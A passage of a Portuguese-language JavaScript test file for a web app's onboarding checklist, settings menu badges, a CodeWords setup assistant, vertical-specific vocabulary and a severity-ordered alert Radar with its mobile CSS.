  const prontos = readFileSync(join(WEB, "app", "prontos.js"), "utf8");
  for (const i of L.ONBOARDING_ITENS) assert.match(prontos, new RegExp(`"${i.secao}"`), `seção «${i.secao}» existe em CONFIG_PRONTAS`);
});

await teste("M32: resumoOnboarding — 0/9 (novo), parcial, 100 % some, opcional não conta, só admin, dispensar por 7 dias e «Já está bom»", () => {
  const AG = 1_000_000_000_000;
  let r = L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG });
  assert.equal(r.total, 11); assert.equal(r.obrigatorios, 9, "site e anúncios são opcionais: 9 obrigatórios de 11"); assert.equal(r.feitos, 0); assert.equal(r.pct, 0); assert.equal(r.completo, false);
  assert.equal(r.pendentes.length, 11); assert.equal(r.proximo.id, "chave_codewords");
  // parcial: 6 de 9 obrigatórios = 67 %
  r = L.resumoOnboarding(ESTADO_FEITOS(TODOS_OBRIG.slice(0, 6)), { admin: true, agora: AG });
  assert.equal(r.obrigFeitos, 6); assert.equal(r.pct, 67); assert.equal(r.proximo.id, "agenda_faixas", "o próximo é o 1º obrigatório pendente (o 7º da ordem)");
  // os 9 obrigatórios prontos (sem site nem anúncios): 100 % → o cartão some
  assert.equal(L.resumoOnboarding(ESTADO_FEITOS(TODOS_OBRIG), { admin: true, agora: AG }), null);
  assert.equal(L.resumoOnboarding(ESTADO_FEITOS([...TODOS_OBRIG, "anuncios_ligados"]), { admin: true, agora: AG }), null);
  // só admin
  assert.equal(L.resumoOnboarding(ESTADO_NOVO(), { admin: false, agora: AG }), null);
  assert.equal(L.resumoOnboarding(null, { admin: true }), null);
  assert.equal(L.resumoOnboarding({ itens: [] }, { admin: true }), null);
  // dispensar por 7 dias: some até a data e volta depois
  const ate = L.dispensarOnboardingAte(AG);
  assert.equal(ate - AG, 7 * 86400000);
  assert.equal(L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG + 3 * 86400000, dispensadoAte: ate }), null);
  assert.notEqual(L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: ate + 1, dispensadoAte: ate }), null, "passados os 7 dias o cartão volta");
  // "Já está bom" conta como feito neste aparelho (e é marcado como pulado)
  r = L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG, pulados: ["funil_ajustado", "agenda_faixas"] });
  assert.equal(r.obrigFeitos, 2); assert.equal(r.itens.find(i => i.id === "funil_ajustado").pulado, true);
  // um item que o servidor já deu como feito não vira "pulado"
  assert.equal(L.resumoOnboarding(ESTADO_FEITOS(["funil_ajustado"]), { admin: true, agora: AG, pulados: ["funil_ajustado"] }).itens.find(i => i.id === "funil_ajustado").pulado, false);
  // o servidor manda só alguns ids (versão antiga): o resto simplesmente não aparece
  r = L.resumoOnboarding({ itens: [{ id: "chave_codewords", feito: false }, { id: "desconhecido", feito: false }] }, { admin: true, agora: AG });
  assert.deepEqual(r.itens.map(i => i.id), ["chave_codewords"]);
  assert.equal(r.itens[0].rota, "#/config/numeros?assistente=novo");
});

await teste("M32: pendenciasConfig — o número do ponto em cada seção do menu (obrigatórios pendentes, sem os já pulados nem o opcional)", () => {
  assert.deepEqual(L.pendenciasConfig(ESTADO_NOVO()), { numeros: 5, departamentos: 1, agenda: 1, usuarios: 1, funis: 1 }, "site e anúncios são opcionais: sem ponto");
  assert.deepEqual(L.pendenciasConfig(ESTADO_FEITOS(["chave_codewords", "aparelho_pareado", "recebimento"])), { numeros: 2, departamentos: 1, agenda: 1, usuarios: 1, funis: 1 });
  assert.deepEqual(L.pendenciasConfig(ESTADO_NOVO(), { pulados: ["funil_ajustado", "colega_convidado"] }), { numeros: 5, departamentos: 1, agenda: 1 });
  assert.deepEqual(L.pendenciasConfig(ESTADO_FEITOS(TODOS_OBRIG)), {}, "completo: nenhum ponto");
  assert.deepEqual(L.pendenciasConfig(null), {});
});

await teste("M32: Início (cartão só para admin, estado por RPC de leitura, «Dispensar»/«Já está bom» em localStorage), menu das Configurações com ponto e ?assistente= abrindo o assistente", () => {
  const ini = ler("web/app/inicio.js"), cfg = ler("web/app/config.js"), cw = ler("web/app/cv-config.js"), css = ler("web/app/relatorios.css");
  assert.match(ini, /if \(!admin\) return null;[\s\S]{0,400}?try \{ return await ctx\.api\.rpcC\("nx_onboarding_estado", \{\}\); \}/, "só admin chama a RPC");
  assert.match(ini, /L\.resumoOnboarding\(onb, \{ pulados: local\.pulados, dispensadoAte: local\.dispensadoAte, admin, podeSecao \}\)/);
  assert.match(ini, /localStorage\.setItem\(chaveOnb/, "escolhas locais em try/catch");
  assert.match(ini, /try \{ localStorage\.setItem\(chaveOnb, JSON\.stringify\(p\)\); \} catch/);
  assert.match(ini, /tipo: "primeiro_uso", titulo: "Tudo pronto para começar\."/, "cliente zerado: órbita com os satélites");
  assert.match(ini, /role: "progressbar", "aria-valuemin": "0", "aria-valuemax": "100", "aria-valuenow": String\(r\.pct\)/);
  assert.match(ini, /"Dispensar por 7 dias"/);
  assert.doesNotMatch(ini, /innerHTML/);
  assert.match(cfg, /L\.pendenciasConfig\(est, \{ pulados \}\)/); assert.match(cfg, /class: "nav-selo cfg-pend"/);
  assert.match(cfg, /ctx\.pode\("admin"\) && vistas\.some/, "o ponto só para admin");
  assert.match(cw, /ctx\.rota\.query\.assistente/);
  assert.match(cw, /history\.replaceState\(history\.state, "", location\.pathname \+ location\.search \+ "#\/config\/numeros"\)/, "limpa o endereço depois de abrir");
  assert.match(css, /\.ini-onb-barra i \{[^}]*background: var\(--c-prod\)/, "barra no acento do produto, por token");
});

/* ============================================================ revisão R119 — checklist, assistente do número, Início e paleta */
console.log("\n(h2) R119 — checklist que não cobra o impossível, assistente sem remontar, palavra da vertical");

await teste("R119: o assistente aberto pelo checklist (?assistente=) limpa o endereço SEM navegar — a lista de Números continua a mesma e se atualiza", () => {
  const cw = ler("web/app/cv-config.js");
  const fim = cw.slice(cw.indexOf("const pedido = ctx.rota && ctx.rota.query && ctx.rota.query.assistente;"), cw.indexOf("/* ============================================================ RESPOSTAS RÁPIDAS */"));
  assert.ok(fim.length > 100, "trecho do pedido encontrado");
  assert.doesNotMatch(fim, /ctx\.navegar\(/, "ctx.navegar remonta a seção: o assistente ficava preso à lista antiga");
  assert.match(fim, /lista\.isConnected && \/\^#\\\/config\\\/numeros\\\?\/\.test\(location\.hash\)/, "só mexe no endereço se a pessoa ainda está nesta tela");
  assert.match(fim, /assistenteCodeWords\(c\)/);
});

await teste("R119: resumoOnboarding conta a partir dos itens recebidos — o «opcional» do servidor vale; sem ele, vale o padrão local", () => {
  const AG = 1_000_000_000_000;
  // servidor novo: script_site e anuncios_ligados opcionais → 9 obrigatórios de 11
  const novo = ESTADO_NOVO();
  assert.deepEqual(novo.itens.filter(i => i.opcional).map(i => i.id), ["script_site", "anuncios_ligados"]);
  let r = L.resumoOnboarding(novo, { admin: true, agora: AG });
  assert.deepEqual([r.total, r.obrigatorios], [11, 9]);
  assert.equal(r.itens.find(i => i.id === "script_site").opcional, true);
  // servidor antigo (script_site obrigatório): a conta segue o que veio, nenhum número fixo no front
  const antigo = ESTADO_NOVO(); antigo.itens.find(i => i.id === "script_site").opcional = false;
  r = L.resumoOnboarding(antigo, { admin: true, agora: AG });
  assert.deepEqual([r.total, r.obrigatorios], [11, 10]);
  // um servidor que tornasse outro item opcional também é obedecido
  const outro = ESTADO_NOVO(); outro.itens.find(i => i.id === "funil_ajustado").opcional = true;
  assert.equal(L.resumoOnboarding(outro, { admin: true, agora: AG }).obrigatorios, 8);
  // só ids (sem o campo): cai no padrão local
  const soIds = { itens: L.ONBOARDING_ITENS.map(i => ({ id: i.id, feito: false })) };
  assert.equal(L.resumoOnboarding(soIds, { admin: true, agora: AG }).obrigatorios, 9);
  // todos os obrigatórios feitos com o site pendente: completo (o cartão some) — antes a clínica sem site parava em 9 de 10
  assert.equal(L.resumoOnboarding(ESTADO_FEITOS(TODOS_OBRIG), { admin: true, agora: AG }), null);
  assert.doesNotMatch(ler("web/app/rel-logica.js").slice(ler("web/app/rel-logica.js").indexOf("export function resumoOnboarding")).split("export function pendenciasConfig")[0], /\b(9|10|11)\b/, "nenhum total escrito à mão na conta");
});

await teste("R119: item cuja seção a pessoa não abre sai do checklist ANTES da conta (mesmos filtros de módulo e papel das Configurações)", () => {
  const AG = 1_000_000_000_000;
  const acesso = ({ papel = "admin", modulos = ["conversas", "crm", "ads"], prontas = null } = {}) => L.filtroSecoesOnboarding({
    temModulo: m => modulos.includes(m),
    pode: min => ({ leitura: 0, atendente: 1, supervisor: 2, admin: 3, gestor: 4 })[papel] >= ({ leitura: 0, atendente: 1, supervisor: 2, admin: 3, gestor: 4 })[min],
    configPronta: prontas ? id => prontas.includes(id) : null });
  // admin do cliente: «Anúncios ligados» abre uma seção só do gestor → some (era link morto «não faz parte do seu plano ou do seu acesso»)
  let r = L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG, podeSecao: acesso() });
  assert.ok(!r.itens.some(i => i.id === "anuncios_ligados")); assert.deepEqual([r.total, r.obrigatorios], [10, 9]);
  // gestor vê os 11
  assert.equal(L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG, podeSecao: acesso({ papel: "gestor" }) }).total, 11);
  // cliente só com Anúncios: números, departamentos, agenda, site e funis são seções invisíveis → sobra o colega (e, para o gestor, os anúncios)
  r = L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG, podeSecao: acesso({ modulos: ["ads"] }) });
  assert.deepEqual(r.itens.map(i => i.id), ["colega_convidado"]); assert.deepEqual([r.obrigatorios, r.pct], [1, 0]);
  assert.equal(L.resumoOnboarding(ESTADO_FEITOS(["colega_convidado"]), { admin: true, agora: AG, podeSecao: acesso({ modulos: ["ads"] }) }), null, "o único que ele pode fazer está feito: 100 %");
  // sem CRM: agenda, site e funil saem; a porcentagem é sobre o que sobrou (5 do número + departamento + colega = 7)
  r = L.resumoOnboarding(ESTADO_FEITOS(["chave_codewords", "aparelho_pareado", "recebimento", "ia_ou_direto", "mensagem_teste", "departamento_horario"]), { admin: true, agora: AG, podeSecao: acesso({ modulos: ["conversas"] }) });
  assert.deepEqual([r.obrigatorios, r.obrigFeitos, r.pct], [7, 6, 86]); assert.equal(r.proximo.id, "colega_convidado");
  // seção ainda em obra não é cobrada
  r = L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG, podeSecao: acesso({ papel: "gestor", prontas: ["numeros", "usuarios"] }) });
  assert.deepEqual([...new Set(r.itens.map(i => i.secao))], ["numeros", "usuarios"]);
  // nada que a pessoa possa fazer: sem cartão
  assert.equal(L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG, podeSecao: () => false }), null);
  // o ponto do menu das Configurações usa a mesma régua
  assert.deepEqual(L.pendenciasConfig(ESTADO_NOVO(), { podeSecao: acesso({ modulos: ["conversas"] }) }), { numeros: 5, departamentos: 1, usuarios: 1 });
  // sem o filtro (chamadas antigas) nada muda
  assert.equal(L.resumoOnboarding(ESTADO_NOVO(), { admin: true, agora: AG }).total, 11);
});

await teste("R119: os filtros do checklist são os declarados nas seções das Configurações (módulo e papel de cada *-config.js)", () => {
  const fontes = ["cv-config.js", "agenda-config.js", "crm-config.js", "rastreio-config.js", "ads-config.js", "config.js"].map(f => ler(`web/app/${f}`)).join("\n");
  const secoes = new Map();
  for (const b of L.ONBOARDING_ITENS) secoes.set(b.secao, { modulo: b.modulo || null, papel: b.papel });
  for (const [id, esperado] of secoes) {
    const m = new RegExp(`\\{ id: "${id}",[^}]*\\}`).exec(fontes);
    assert.ok(m, `seção «${id}» declarada em algum *-config.js`);
    const papel = (/papelMin: "([a-z]+)"/.exec(m[0]) || [])[1] || null, modulo = (/modulo: "([a-z]+)"/.exec(m[0]) || [])[1] || null;
    assert.deepEqual({ modulo, papel }, esperado, `seção «${id}»: o checklist usa o mesmo módulo e papel da tela`);
  }
  // um item da mesma seção nunca diverge de outro
  for (const b of L.ONBOARDING_ITENS) assert.deepEqual({ modulo: b.modulo || null, papel: b.papel }, secoes.get(b.secao));
  const ini = ler("web/app/inicio.js");
  assert.match(ini, /L\.filtroSecoesOnboarding\(\{ temModulo: ctx\.temModulo, pode: ctx\.pode, configPronta: ctx\.configPronta \}\)/);
});

await teste("R119: «Sim, chegou» no teste do assistente marca «Mensagem de teste enviada» neste aparelho (a mesma chave do «Já está bom»)", () => {
  const cw = ler("web/app/cv-config.js"), ini = ler("web/app/inicio.js"), cfg = ler("web/app/config.js");
  const chave = "`nx-onb:${ctx.cliente.id}:${(ctx.sessao && ctx.sessao.conta && ctx.sessao.conta.id) || \"-\"}`";
  for (const [nome, src] of [["cv-config", cw], ["inicio", ini], ["config", cfg]]) assert.ok(src.includes(chave), `${nome}: a mesma chave local`);
  assert.match(cw, /p\.pulados = \[\.\.\.new Set\(\[\.\.\.\(Array\.isArray\(p\.pulados\) \? p\.pulados : \[\]\), "mensagem_teste"\]\)\];\s*localStorage\.setItem\(chave, JSON\.stringify\(p\)\);/, "acrescenta sem apagar o resto (dispensadoAte, outros pulados)");
  assert.match(cw, /chegou\.addEventListener\("click", \(\) => \{ testeChegou = true; marcarTesteNoChecklist\(\);/);
  assert.ok(L.ONBOARDING_ITENS.some(i => i.id === "mensagem_teste"), "o id marcado existe no checklist");
  // e o Início conta esse item como feito
  const r = L.resumoOnboarding(ESTADO_FEITOS(["chave_codewords", "aparelho_pareado", "recebimento", "ia_ou_direto"]), { admin: true, agora: 1, pulados: ["mensagem_teste"] });
  assert.equal(r.itens.find(i => i.id === "mensagem_teste").feito, true); assert.equal(r.obrigFeitos, 5);
});

await teste("R119: Início — outra empresa não herda o checklist nem os números da anterior; pulso não reconsulta o checklist sem cartão", () => {
  const ini = ler("web/app/inicio.js");
  assert.match(ini, /if \(donoDados !== dono\) \{ ultimoOnb = null; ultimoDado = null; ultimaAgenda = null; ultimoJson = ""; maisAberto = false; donoDados = dono; \}/);
  assert.match(ini, /const dono = `\$\{ctx\.cliente\.id\}\|/);
  assert.match(ini, /if \(!reler && ultimoOnb && resumoOnb\(ultimoOnb\) === null\) return ultimoOnb;/, "completo, dispensado ou tudo marcado: o pulso não gasta a consulta");
  assert.match(ini, /buscarOnboarding\(forcar \|\| primeira\)/, "abrir a tela e «Atualizar» sempre releem");
});

await teste("R119: manchete e paleta com a palavra da vertical (consulta / visita / entrega), a mesma das Automações", async () => {
  const CAT = await import("../web/app/auto-catalogo.js");
  for (const v of ["odonto", "oficina", "loja", "generico", "desconhecida", undefined]) {
    assert.equal(L.palavraAgenda(v).um, CAT.palavraConsulta(v), `vertical ${v}`);
    assert.equal(L.palavraAgenda(v).varios, `${CAT.palavraConsulta(v)}s`);
  }
  const d = base({ negocios: { abertos: 0, valor_aberto: 0 } });
  const oficina = { ...VOC, consulta: L.palavraAgenda("oficina").um, consultas: L.palavraAgenda("oficina").varios };
  assert.equal(L.manchete(d, { agenda: agendaCom(2), voc: oficina }).texto, "Hoje tem 2 visitas.");
  assert.equal(L.manchete(d, { agenda: agendaCom(1), voc: oficina }).texto, "Hoje tem 1 visita.");
  const loja = { ...VOC, consulta: L.palavraAgenda("loja").um, consultas: L.palavraAgenda("loja").varios };
  assert.equal(L.manchete(d, { agenda: agendaCom(3), voc: loja }).texto, "Hoje tem 3 entregas.");
  assert.equal(L.manchete(d, { agenda: agendaCom(1), voc: VOC }).texto, "Hoje tem 1 consulta.", "sem a palavra no vocabulário continua «consulta»");
  assert.match(ler("web/app/inicio.js"), /consulta: palavra\.um, consultas: palavra\.varios/);
  // paleta de comandos
  const CMD = await import("../web/app/comandos.js");
  const VOCAB = await import("../web/app/vocab.js");
  const amb = vertical => ({ vocab: VOCAB.vocab(vertical), rotaOk: () => true, pode: () => true, empresas: 1, instalar: false, suporte: false, temCliente: true });
  const marcar = vertical => CMD.acoesPadrao(amb(vertical), { "marcar-consulta": () => {} }).find(c => c.id === "marcar-consulta");
  assert.equal(marcar("odonto").rotulo, "Marcar consulta"); assert.equal(marcar("generico").rotulo, "Marcar consulta");
  assert.equal(marcar("oficina").rotulo, "Marcar visita"); assert.equal(marcar("loja").rotulo, "Marcar entrega");
  for (const v of ["odonto", "oficina", "loja", "generico"]) assert.equal(marcar(v).rotulo, `Marcar ${CAT.palavraConsulta(v)}`);
  // com a Agenda aberta (ela registra «agenda.marcar»), a ação genérica não repete, mesmo com rótulo diferente
  const daTela = [{ id: "agenda.marcar", rotulo: "Marcar consulta", fazer() {}, origem: "tela" }];
  assert.ok(!CMD.juntarAcoes([marcar("oficina")], daTela).geral.some(c => c.id === "marcar-consulta"));
  assert.ok(CMD.juntarAcoes([marcar("oficina")], []).geral.some(c => c.id === "marcar-consulta"), "fora da Agenda ela aparece");
  assert.match(ler("web/app/agenda.js"), /id: "agenda\.marcar"/, "o id que a Agenda registra é o que a paleta conhece");
});

await teste("R119: menu das Configurações — o nome acessível do item com pendência não repete o número", () => {
  const cfg = ler("web/app/config.js");
  assert.match(cfg, /const nome = \(a\.querySelector\("span:not\(\.nav-selo\)"\) \|\| a\)\.textContent\.trim\(\);\s*a\.appendChild\(h\("span", \{ class: "nav-selo cfg-pend"/, "o título é lido antes de o selo entrar");
  assert.match(cfg, /a\.setAttribute\("aria-label", `\$\{nome\}, \$\{n\} /);
  assert.doesNotMatch(cfg, /aria-label", `\$\{a\.textContent/);
});

await teste("R119: «Copiar prompt para o CodeWords» — trava o botão, copia dentro do toque, nomeia o botão pelo resultado, leva o foco ao Service ID; «Ligar na IA» espera o ID", () => {
  const cw = ler("web/app/cv-config.js");
  const bloco = cw.slice(cw.indexOf("async function assistenteCodeWords(canal)"), cw.indexOf("/* ---------------- assistente em 5 passos */"));
  // (a) carregando, sem clique duplo
  assert.match(bloco, /bPrompt\.addEventListener\("click", \(\) => \{\s*if \(bPrompt\.disabled\) return;/, "o clique não é async: a cópia começa ainda dentro do toque");
  assert.match(bloco, /ui\.carregando\(bPrompt, \(async \(\) => \{/);
  // (b) copiarDepois chamado de forma síncrona, com a promessa do texto; sem ele, cai no ui.copiar depois da espera
  const clique = bloco.slice(bloco.indexOf('bPrompt.addEventListener("click"'), bloco.indexOf("function mostrarPrompt"));
  assert.match(clique, /typeof ui\.copiarDepois === "function"\s*\? ui\.copiarDepois\(textoPronto, \{ aviso: null \}\)\s*: textoPronto\.then\(t => ui\.copiar\(t, \{ aviso: null \}\)\)/);
  assert.ok(clique.indexOf("ui.copiarDepois(textoPronto") < clique.indexOf("ui.carregando(bPrompt"), "a cópia é pedida antes de qualquer espera");
  assert.doesNotMatch(clique.slice(0, clique.indexOf("ui.copiarDepois(textoPronto")).replace(/const receita = \(async \(\) => \{[\s\S]*?\}\)\(\);/, ""), /\bawait\b/, "nenhum await entre o toque e o pedido de cópia");
  // (c) o nome do botão da caixa segue o resultado
  assert.match(bloco, /const rotuloCopiar = h\("span", null, "Copiar prompt"\);/);
  assert.match(bloco, /if \(ok\) \{\s*rotuloCopiar\.textContent = "Copiar de novo";/);
  assert.doesNotMatch(bloco, /ui\.icone\("copiar"\), "Copiar de novo"\)/, "não nasce «Copiar de novo» antes de copiar");
  // (d) foco no Service ID, com a dica
  assert.match(bloco, /dicaService\.hidden = false;/); assert.match(bloco, /inpService\.focus\(\{ preventScroll: true \}\)/);
  assert.match(bloco, /cole aqui o Service ID que ele mostrar/);
  // (e) «Ligar o número na IA» desabilitado e explicado enquanto o Service ID está vazio
  assert.match(bloco, /const falta = !inpService\.value\.trim\(\);\s*bFluxo\.disabled = falta;/);
  assert.match(bloco, /inpService\.addEventListener\("input", ajustarFluxo\);\s*ajustarFluxo\(\);/);
  assert.match(bloco, /dicaFluxo\.hidden = !falta;/);
  // a ordem 1-2-3 escrita no passo continua
  const i1 = bloco.indexOf('h("strong", null, "1. ")'), i2 = bloco.indexOf('h("strong", null, "2. ")'), i3 = bloco.indexOf('h("strong", null, "3. ")');
  assert.ok(i1 > 0 && i1 < i2 && i2 < i3, "1 copiar o prompt, 2 colar o Service ID, 3 ligar o número");
  assert.ok(bloco.indexOf("bPrompt), receitaBox") > i1 && bloco.indexOf("bPrompt), receitaBox") < i2 && bloco.indexOf("bFluxo, bPrefs") > i3);
});

await teste("R119: erros do assistente CodeWords dizem o campo — hint «numero» → campo do número, texto por campo, passo recolhido se abre, detalhe do servidor no aparelho errado", () => {
  const cw = ler("web/app/cv-config.js");
  assert.match(cw, /const CAMPO_DO_HINT = \{ numero: "numero_exibicao"/);
  assert.match(cw, /numero_exibicao: "Informe o número com DDI e DDD, ex\.: \+55 12 99999-9999"/);
  assert.match(cw, /codewords_service_id: "Cole só o identificador do fluxo, sem a URL\."/);
  assert.match(cw, /if \(x && x\.corpoEl\.hidden\) \{ expandido = li\.dataset\.passo; desenharPassos\(\); \}/, "o passo recolhido abre antes de marcar o campo");
  assert.match(cw, /\} catch \(e\) \{\s*if \(erroDoServidorNoCampo\(e\)\) return false;\s*ui\.toast\(ui\.mensagemErro\(e\), \{ tipo: "erro" \}\);/);
  assert.doesNotMatch(cw.slice(cw.indexOf("async function assistenteCodeWords(canal)"), cw.indexOf("/* ---------------- assistente em 5 passos */")), /"Confira este campo\."\); return false;/, "o texto genérico saiu do assistente CodeWords");
  assert.match(cw, /\(c === "numero_diferente" \|\| c === "aparelho_nao_encontrado"\) && e\.detalhe_texto\) return String\(e\.detalhe_texto\)/);
  // a regra do Service ID é a mesma do banco
  assert.match(cw, /!\/\^\[A-Za-z0-9_-\]\{1,120\}\$\/\.test\(String\(d\.codewords_service_id\)\)/);
  assert.match(readFileSync(join(RAIZ, "supabase", "migrations", "20260929a_codewords.sql"), "utf8"), /v_service !~ '\^\[A-Za-z0-9_-\]\{1,120\}\$'/);
  assert.match(readFileSync(join(RAIZ, "supabase", "migrations", "20260929a_codewords.sql"), "utf8"), /if v_num is null then raise exception 'dados_invalidos' using errcode = '22023', hint = 'numero';/);
});

/* ============================================================ M39 — painéis no celular: manchete na 1ª tela e Radar com gravidade */
console.log("\n(i) M39 — Anúncios/Relatórios no celular e Radar com gravidade");

const conexao = (ativo, extra = {}) => ({ nome: "Conexão com Meta", ativo, a: { mensagem: "caiu", criado_em: "2026-10-01T10:00:00Z" }, ...extra });
const episodio = (sev, ativo, nome = `${sev}-${ativo ? "ativo" : "resolvido"}`) => ({ sev, ativo, nome, msg: "m", acao: "a", desde: "ontem" });

await teste("M39: ordenarRadar — o crítico ativo sempre no topo, depois alerta e informativo; os resolvidos vêm depois dos ativos; em empate vale a ordem recebida", () => {
  const R = {
    conexoes: [conexao(false)],
    episodios: [episodio("info", true, "i1"), episodio("alerta", true, "a1"), episodio("critico", false, "c-res"), episodio("critico", true, "c1"), episodio("alerta", true, "a2"), episodio("info", false, "i-res")],
  };
  const ordem = L.ordenarRadar(R).map(x => `${x.sev}:${x.ativo ? "ativo" : "resolvido"}:${x.ref.nome}`);
  assert.deepEqual(ordem, [
    "critico:ativo:c1",                       // o crítico ativo é o 1º, mesmo vindo no meio do histórico
    "alerta:ativo:a1", "alerta:ativo:a2",     // empate: a ordem do montarRadar
    "info:ativo:i1",
    "critico:resolvido:Conexão com Meta", "critico:resolvido:c-res",    // resolvidos por último: conexão antes do histórico, ambos críticos
    "info:resolvido:i-res"]);
  assert.equal(L.ordenarRadar(R)[0].tipo, "episodio");
  // uma conexão caída (ativa) é sempre crítica e vence qualquer episódio ativo; entre críticos ativos a conexão vem antes (ordem recebida)
  const R2 = { conexoes: [conexao(true)], episodios: [episodio("critico", true, "c1"), episodio("alerta", true, "a1")] };
  assert.deepEqual(L.ordenarRadar(R2).map(x => x.tipo + ":" + x.sev), ["conexao:critico", "episodio:critico", "episodio:alerta"]);
  // gravidade desconhecida vira «alerta» (nunca some, nunca exagera); entrada vazia ou nula não quebra
  assert.equal(L.nivelSev("grave?"), "alerta"); assert.equal(L.nivelSev("critico"), "critico"); assert.equal(L.nivelSev(undefined), "alerta");
  assert.deepEqual(L.ordenarRadar({ conexoes: [], episodios: [episodio("???", true)] }).map(x => x.sev), ["alerta"]);
  assert.deepEqual(L.ordenarRadar(null), []); assert.deepEqual(L.ordenarRadar({}), []);
  // não muda o que recebeu
  const antes = JSON.stringify(R); L.ordenarRadar(R); assert.equal(JSON.stringify(R), antes);
  // as três gravidades têm rótulo escrito e ícone (nunca só cor)
  for (const s of ["critico", "alerta", "info"]) { assert.ok(L.SEV_ROTULO[s]); assert.ok(L.SEV_ICONE[s]); assert.equal(typeof L.SEV_ORDEM[s], "number"); }
  assert.equal(new Set(Object.values(L.SEV_ICONE)).size, 3, "um ícone por gravidade");
});

await teste("M39: textoChipAnuncios e textoChipRelatorios — «Últimos 30 dias · Tudo», «02/09 a 01/10 · Funil X», «Todos os departamentos»", () => {
  assert.equal(L.textoChipAnuncios(30, ""), "Últimos 30 dias · Tudo");
  assert.equal(L.textoChipAnuncios(7, "meta"), "Últimos 7 dias · Meta");
  assert.equal(L.textoChipAnuncios(60, "google"), "Últimos 60 dias · Google");
  assert.equal(L.textoChipAnuncios(undefined, ""), "Últimos 30 dias · Tudo");
  assert.equal(L.textoChipRelatorios({ preset: 30 }), "Últimos 30 dias · Todos os funis");
  assert.equal(L.textoChipRelatorios({ preset: 90, aba: "atendimento" }), "Últimos 90 dias · Todos os departamentos");
  assert.equal(L.textoChipRelatorios({ preset: "per", de: "2026-09-02", ate: "2026-10-01", nome: "Funil Consultas" }), "02/09 a 01/10 · Funil Consultas");
  assert.equal(L.textoChipRelatorios({ preset: "per", de: null, ate: null }), "Últimos 30 dias · Todos os funis", "personalizado sem datas cai no padrão");
  assert.equal(L.textoChipRelatorios({ preset: 15 }), "Últimos 30 dias · Todos os funis", "preset desconhecido não inventa");
});

await teste("M39: Anúncios e Relatórios — abas por ui.segmentado, chip-resumo que abre a folha, «Atualizado» em texto pequeno com botão-ícone; os controles largos continuam para telas grandes", () => {
  const ads = ler("web/app/anuncios.js"), rel = ler("web/app/relatorios.js"), css = ler("web/app/relatorios.css");
  for (const [nome, src] of [["anuncios", ads], ["relatorios", rel]]) {
    assert.match(src, /ui\.segmentado\(\{ tipo: "abas"/, `${nome}: abas por ui.segmentado`);
    assert.match(src, /class: "rel-resumo", "aria-haspopup": "dialog"/, `${nome}: chip-resumo`);
    assert.match(src, /class: "rel-filtros-lg"/, `${nome}: segmentos largos preservados`);
    assert.match(src, /ui\.modal\(\{ titulo: "Período e (plataforma|filtros)"[^]*?protegerTexto: false/, `${nome}: a folha`);
    assert.match(src, /rel-btn rel-btn-sec rel-btn-ic/, `${nome}: Atualizar também como botão-ícone`);
    assert.match(src, /ui\.icone\("reabrir"\), h\("span", \{ class: "rel-rot" \}, "Atualizar"\)/, `${nome}: o nome acessível continua «Atualizar»`);
    assert.doesNotMatch(src, /innerHTML/);
  }
  assert.match(ads, /L\.textoChipAnuncios\(S\.dias, S\.plat\)/); assert.match(rel, /L\.textoChipRelatorios\(\{ preset: P\.preset, de: P\.de, ate: P\.ate, aba, nome \}\)/);
  assert.match(ads, /rel-so-largo[^]*?Ajustes de anúncios/, "os atalhos do gestor ficam para telas largas…");
  assert.match(ads, /Mais ações[^]*?rotulo: "Ajustes de anúncios", icone: "engrenagem"/, "…e no ⋮ do celular");
  assert.match(rel, /const v = L\.validarPeriodo\(de, ate\);\s*if \(!v\.ok\) \{ api\.erro\(v\.texto\); return false; \}/, "a folha valida o período antes de aplicar");
  assert.match(ads, /abaRadar|L\.ordenarRadar\(R\)\.forEach/, "o Radar usa a ordenação por gravidade");
  // CSS: o celular mostra o chip e esconde os segmentos; as regras que a frente A trava seguem no arquivo
  assert.match(css, /\.rel-resumo, \.rel-so-movel \{ display: none; \}/);
  assert.match(css, /@media \(max-width: 760px\) \{\s*\.rel \{ gap: \.4rem; \}[^]*?\.rel-filtros-lg \{ display: none; \}[^]*?\.rel-resumo \{ display: inline-flex;/);
  assert.match(css, /\.ads-heroi \.rel-olho \{ display: none; \}/, "o herói não repete o chip");
  assert.match(css, /\.ads-tabela td\.num::before \{[^}]*white-space: normal/); assert.match(css, /\.cfgf-codigo \{[^}]*white-space: pre-wrap/);
  assert.match(css, /@media \(max-width: 400px\) \{\s*\.rel-aba \{ padding-inline: \.5rem;/, "a trava da frente A (abas em 375 px) continua");
});

await teste("M39: Radar — cada alerta com barra lateral de 3 px, ícone e rótulo da gravidade por token --c-sev-*, o crítico ativo no topo e o rótulo nunca só cor", () => {
  const ads = ler("web/app/anuncios.js"), css = ler("web/app/relatorios.css");
  assert.match(ads, /L\.ordenarRadar\(R\)\.forEach\(\(it, n\) => lista\.append\(it\.tipo === "conexao" \? alertaConexao\(it, n\) : alertaEpisodio\(it, n\)\)\)/);
  assert.match(ads, /dataset: \{ sev \}/, "o <li> leva data-sev");
  assert.match(ads, /h\("span", \{ class: "ads-sev-marca" \}, ui\.icone\(L\.SEV_ICONE\[sev\]\), h\("span", \{ class: "ads-sev-rot" \}, L\.SEV_ROTULO\[sev\]\)\)/, "ícone + rótulo escrito");
  assert.match(css, /\.ads-al\[data-sev="critico"\] \{ --sev: var\(--c-sev-crit\); \}/);
  assert.match(css, /\.ads-al\[data-sev="alerta"\] \{ --sev: var\(--c-sev-aten\); \}/);
  assert.match(css, /\.ads-al\[data-sev="info"\] \{ --sev: var\(--c-sev-info\); \}/);
  assert.match(css, /\.ads-alertas \.ads-al \{[^}]*border-left: 3px solid var\(--sev/, "barra lateral de 3 px");
  assert.match(css, /\.ads-sev-marca \{[^}]*color: var\(--sev/);
  assert.match(css, /\.ads-alertas \.ads-al\.resolvido \{ opacity: 1;/, "resolvido não perde contraste por opacidade");
  const bloco = css.slice(css.indexOf("M39 — painéis no celular"));
  assert.doesNotMatch(bloco, /#[0-9a-fA-F]{3,8}\b/, "nenhuma cor escrita no bloco novo: só token");
